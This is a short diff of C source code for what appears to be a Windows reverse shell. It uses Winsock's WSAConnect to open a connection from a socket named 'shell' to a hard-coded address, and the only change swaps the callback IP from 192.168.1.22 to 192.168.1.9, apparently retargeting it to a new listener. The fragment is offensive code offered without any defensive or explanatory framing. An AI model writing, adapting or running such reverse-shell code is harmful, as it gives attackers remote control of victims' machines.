@@ -21,7 +21,7 @@ int main() {
 
     shell_addr.sin_port = htons(port);
     shell_addr.sin_family = AF_INET;
-    shell_addr.sin_addr.s_addr = inet_addr("192.168.1.22");
+    shell_addr.sin_addr.s_addr = inet_addr("192.168.1.9");
 
     connection = WSAConnect(shell, (struct sockaddr*) &shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL);
     if (connection == SOCKET_ERROR) {
